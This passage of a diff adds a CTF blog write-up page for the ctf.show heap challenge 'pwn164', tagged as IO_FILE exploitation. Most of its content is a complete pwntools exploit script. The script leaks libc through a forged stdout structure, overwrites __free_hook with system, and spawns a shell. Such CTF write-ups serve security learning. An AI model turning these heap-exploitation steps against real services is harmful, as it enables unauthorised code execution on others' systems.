add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;/bin/sh\x00&quot;+p64(system))</span><br><span class="line"></span><br><span class="line">    delete()</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330172347857.png"  alt="image-20260330172347857"></p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./pwn164&quot;</span><br><span class="line">remote_host = &quot;pwn.challenge.ctf.show&quot;</span><br><span class="line">remote_port = 28188</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;warn&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">def sla(a, b):p.sendlineafter(a, b)</span><br><span class="line">def sl(a):p.sendline(a)</span><br><span class="line">def s(a):p.send(a)</span><br><span class="line">def ru(a):p.recvuntil(a)</span><br><span class="line">def sa(a, b):p.sendafter(a, b)</span><br><span class="line">def bin_sys(libc_base) : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">def uu64() : return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def uu32() : return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&quot;Size?\n&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Content?\n&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def zero():</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;1433233&#x27;)</span><br><span class="line"></span><br><span class="line">def attack():</span><br><span class="line">    add(0x70,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    </span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    # dbg()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x70,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x78+p64(0x101)+b&quot;\x2d\xc7&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;*0x33+p64(0xfbad1887) + p64(0)*3 + p8(0x58))</span><br><span class="line">    libc_base = u64(p.recvuntil(b&quot;\x7f&quot;, timeout=0.1)[-6:].ljust(8, b&#x27;\x00&#x27;))-0x3ec758</span><br><span class="line">    if libc_base ==-0x3ec758:</span><br><span class="line">        exit(-1)</span><br><span class="line">        </span><br><span class="line">    print(hex(libc_base))</span><br><span class="line">    # dbg()</span><br><span class="line"></span><br><span class="line">    free= libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    one_gadget = libc_base + 0x4f322</span><br><span class="line">    zero()</span><br><span class="line">    add(0x110,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x110,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x118+p64(0x121)+p64(free-8))</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;/bin/sh\x00&quot;+p64(system))</span><br><span class="line"></span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        p=process(&quot;./pwn164&quot;)</span><br><span class="line">        # p=remote(&quot;pwn.challenge.ctf.show&quot;,28188)</span><br><span class="line">        attack()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        print(&quot;wrong&quot;)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+
+
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/IO-FILE%E5%88%A9%E7%94%A8/">IO_FILE利用</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/03/16/ciscn%E4%B9%8Bprotobuf%E5%A3%B3/"
+                                   title="ciscn之protobuf壳"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">ciscn之protobuf壳</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/07/ciscn18%E5%B1%8A-%E5%8D%8A%E5%86%B3%E8%B5%9B/"
+                                   title="ciscn18届_半决赛"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">ciscn18届_半决赛</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
